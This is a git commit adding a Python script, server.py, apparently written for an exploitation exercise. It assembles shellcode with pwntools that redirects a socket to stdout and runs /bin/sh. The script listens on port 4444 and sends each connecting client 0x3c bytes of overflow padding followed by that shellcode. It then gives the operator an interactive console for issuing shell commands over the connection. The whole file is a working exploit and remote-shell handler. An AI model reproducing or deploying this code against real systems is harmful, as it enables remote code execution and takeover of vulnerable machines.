2cb0d755a2a46a36a433048157f25e3d51be1bc3
Naooooooooooooo <134948791+Naooooooooooooo@users.noreply.github.com>
2023-07-26 12:35:08 +0700

    Create server.py

---
+++ kidding/server.py
@@ -0,0 +1,41 @@
+import socket
+from pwn import *
+
+#dup2(socket, stdout) and execve('/bin/sh')
+shell = asm('''
+            mov eax, 0x3f
+            mov ebx, edi
+            mov ecx, 1
+            int 0x80
+            
+            
+            mov eax, 0xb
+            push 0x68732f
+            push 0x6e69622f
+            mov ebx, esp
+            mov ecx, 0
+            mov edx, 0
+            int 0x80''')
+soc = socket.socket()
+port = 4444
+
+soc.bind(('', port))
+soc.listen(1)
+
+print('Socket is listening')
+
+while True:
+    con, addr = soc.accept()
+    print('GOt connection from {}'.format(addr))
+
+    con.send(b'A'*0x3c + shell)
+    print('call shell')
+    # interactive
+    while True:
+        print('> ', end = '')
+        command = input()
+        command += '\n'
+        con.send(command.encode())
+        if 'cd' not in command:
+            print(con.recv(1024).decode())
+    con.close()
